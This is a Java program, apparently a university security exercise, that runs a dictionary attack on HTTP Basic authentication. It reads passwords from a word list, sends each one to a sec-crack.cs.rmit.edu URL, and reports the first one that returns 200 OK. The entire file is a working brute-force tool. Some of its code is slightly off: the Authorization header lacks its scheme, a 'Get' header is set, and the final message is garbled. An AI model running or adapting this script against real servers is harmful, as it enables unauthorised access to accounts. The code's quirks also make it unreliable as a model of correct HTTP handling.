
import java.net.*;
import java.io.*;
import java.util.*;


public class Dictionary {

  public static void main(String args[])
  {
  int i,j,k;
  String pass = new String();
  String UserPass = new String();
  String status = new String();
  String status1 = new String();
  BasicAuth auth = new BasicAuth();
  URLConnection  connect;
   int start,end,diff;
  try {
               URL url = new URL ("http://sec-crack.cs.rmit.edu./SEC/2/");



              start =System.currentTimeMillis();

               BufferedReader dis = new BufferedReader(new FileReader("words"));


         while ((pass = dis.readLine()) != null)
          {


              UserPass= auth.encode("",pass);

              connect = url.openConnection();
              connect.setDoInput(true);
              connect.setDoOutput(true);

              connect.setRequestProperty("Host","sec-crack.cs.rmit.edu.");
              connect.setRequestProperty("Get","/SEC/2/ HTTP/1.1");
              connect.setRequestProperty("Authorization"," " + UserPass);
              connect.connect();
              status =connect.getHeaderField(0);
              status1 = status.substring( 9,12);
             if (status.equalsIgnoreCase("HTTP/1.1 200 OK"))
              {
              System.out.println("Password is " + pass);
              end=System.currentTimeMillis();
              diff = end - start;
              System.out.println("Time Taken = " + (diff/1000) + " secs");
              System.exit(0);
              }
              ((HttpURLConnection)connect).disconnect();
              connect = null;
            }

            System.out.println(" match found");

            dis.close();
            dis=null;

            connect = null;

     }

    catch (MalformedURLException malerr)
  {
  System.err.println("Unable  Open URL" + malerr);
  }

  catch (Exception ioerr)
  {
  System.err.println("Unable  open file" + ioerr);
  }




  }
}